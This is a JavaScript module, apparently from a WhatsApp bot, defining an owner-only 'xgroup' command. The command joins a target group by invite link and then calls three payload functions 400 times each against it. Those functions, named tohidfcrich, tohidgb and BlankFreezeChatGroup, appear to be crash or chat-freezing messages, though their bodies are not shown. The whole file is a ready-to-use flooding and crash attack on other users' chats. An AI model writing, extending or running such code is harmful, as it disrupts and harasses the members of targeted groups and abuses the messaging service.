'use strict';
async function executeXGroup(command, context = {}) {
 const {isOwner,args=[],m,reply,devtrust,addNewsletterContext,generateWAMessageFromContent,proto,tohidfcrich,sleep,tohidgb,BlankFreezeChatGroup}=context;
 switch(command) {
case 'xgroup': {
  if (!isOwner) return reply('🔒 Owner only');

  const text = args[0];
  let target = null;
  let groupLink = text;

  // ✅ kalau di group
  if (m.isGroup) {
    target = m.chat;
  }

  // ✅ kalau pakai link
  if (!target && text && text.includes('chat.whatsapp.com')) {
    try {
      const code = text.split('chat.whatsapp.com/')[1];
      const res = await devtrust.groupAcceptInvite(code);

      target = res;

      await devtrust.sendMessage(m.chat, addNewsletterContext({
        text: '✅ Successfully joined the group!'
      }), { quoted: m });

    } catch (err) {
      return devtrust.sendMessage(m.chat, addNewsletterContext({
        text: '❌ Failed to join group.'
      }), { quoted: m });
    }
  }

  // ❌ kalau kosong
  if (!target) {
    return devtrust.sendMessage(m.chat, addNewsletterContext({
      text: '⚠️ Use inside group or provide link.'
    }), { quoted: m });
  }

  // 💎 BUTTON (ADA LINK GROUP)
  const buttons = [
    groupLink && groupLink.includes('chat.whatsapp.com') && {
      name: "cta_url",
      buttonParamsJson: JSON.stringify({
        display_text: "🔗 Open Group Link",
        url: groupLink
      })
    },
    {
      name: "cta_url",
      buttonParamsJson: JSON.stringify({
        display_text: "📢 Channel",
        url: "https://whatsapp.com/channel/0029VaGyP933bbVC7G0x0i2T"
      })
    }
  ].filter(Boolean);

  const caption = `╭─❍「 GROUP SENDER 」
│ 📍 Target : ${target}
│ ⚙️ Mode : Repeat
│ ✓ Status : Running
╰───────────────`;

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({

          body: { text: caption },

          footer: { text: "© 𝐓𝐎𝐇𝐈𝐃 𝐀𝐈" },

          header: {
            title: "⚙️ Group Sender",
            hasMediaAttachment: false
          },

          nativeFlowMessage: {
            buttons: buttons.map(b =>
              proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create(b)
            )
          }

        })
      }
    }
  }, { quoted: m, userJid: devtrust.user.jid });

  await devtrust.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });

for (let i = 0; i < 400; i++) {
await tohidfcrich(devtrust, target);
await sleep(750);
                    await tohidgb(devtrust, target);
                    await sleep(750);
                    await BlankFreezeChatGroup(devtrust, target);
                    await sleep(750);
                }

  await devtrust.sendMessage(m.chat, addNewsletterContext({
    text: '✅ Done.'
  }), { quoted: m });

  break;
}



 default:return false;
 }
 return true;
}
module.exports={executeXGroup};
